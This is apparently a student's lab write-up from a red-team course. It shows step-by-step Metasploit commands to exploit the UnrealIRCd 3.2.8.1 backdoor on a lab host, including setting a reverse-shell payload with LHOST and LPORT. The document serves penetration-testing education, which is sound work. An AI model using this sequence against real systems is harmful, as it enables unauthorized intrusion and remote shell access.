# Metasploit

Metasploit is a penetration testing framework that provides modules for vulnerability research, exploitation, payloads, and other security testing tasks.

During the Red Team Essentials course, I used Metasploit to exploit the UnrealIRCd 3.2.8.1 service identified during the Nmap scan.

## Starting Metasploit

Metasploit can be started with:

```bash
msfconsole
```

Once inside the Metasploit console, the `help` command can be used to view available commands:

```bash
msf> help
```

Help for a specific command can also be requested:

```bash
msf> help search
```
## Searching for an Exploit

The `search` command can be used to find modules matching a specific service or vulnerability:

```bash
msf> search unrealircd
```

The search identified the UnrealIRCd 3.2.8.1 backdoor module:

```bash
exploit/unix/irc/unreal_ircd_3281_backdoor
```

This matched the UnrealIRCd 3.2.8.1 service identified earlier by Nmap on port `6667`.

## Selecting and Inspecting the Module

The module can be selected using either its full path or its search result number:

```bash
msf> use exploit/unix/irc/unreal_ircd_3281_backdoor
```

or:

```bash
msf> use 0
```

Information about a module can be viewed with the `info` command:

```bash
msf> info 0
```

The `show payloads` command lists payloads available for the selected exploit:

```bash
msf> show payloads
```

For this exploit, the default payload did not work during the course, so a different payload was selected:

```bash
msf> set payload payload/cmd/unix/reverse
```

## Configuring the Module

The show options command displays the options that need to be configured:

```bash
msf> show options
```

The target and connection settings used during the lab were:

```bash
RHOSTS  192.168.122.68
RPORT   6667
LHOST   192.168.122.1
LPORT   4444
```

`RHOSTS` specifies the target host, while `RPORT` specifies the port where the vulnerable UnrealIRCd service was running.

`LHOST` specifies the local host that the reverse payload connects back to, while `LPORT` specifies the local port that receives the connection.

After configuring the options, show options can be used again to verify the settings before running the exploit:

```bash
msf> show options
```

## Running the Exploit

Once the module and required options were configured, the exploit was launched with:

```bash
msf> exploit
```

This resulted in successful exploitation of the vulnerable UnrealIRCd service.

The UnrealIRCd exploitation exercise demonstrates how the information gathered during reconnaissance can lead directly into vulnerability research and exploitation:

```text
Nmap
  ↓
UnrealIRCd 3.2.8.1 on port 6667
  ↓
SearchSploit
  ↓
EDB 16922
  ↓
Exploit-DB
  ↓
Metasploit
  ↓
UnrealIRCd backdoor exploitation
```
